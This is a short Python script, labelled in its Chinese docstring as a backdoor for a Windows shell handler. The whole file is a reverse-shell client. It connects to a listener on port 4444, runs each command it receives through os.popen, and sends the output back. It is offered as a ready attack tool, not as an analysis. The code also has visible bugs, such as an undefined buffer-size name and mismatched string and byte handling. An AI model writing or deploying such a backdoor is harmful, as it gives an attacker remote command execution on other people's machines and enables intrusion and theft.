#-*- coding: utf-8 -*-

"""
用于hander_win_shell下的后门
"""

import os,sys
from socket import *

class TcpClient:
    HOST = '127.0.0.1'
    PORT = 4444
    BUFSIZ = 4096
    ADDR=(HOST, PORT)
    def __init__(self):
        self.client = socket(AF_INET, SOCK_STREAM)
        self.client.connect(self.ADDR)
        while True:
            data = self.client.recv(BUFSIZ)
            if data:
                try:
                    if data == "exit":
                        self.client.close()
                        break
                    ME = os.popen(data.decode('utf8'))
                    os_result = ME.read()
                    #print(os_result)
                    self.client.sendall(os_result)
                    
                except:
                    self.client.close()
                  
if __name__ == '__main__':
    client=TcpClient()
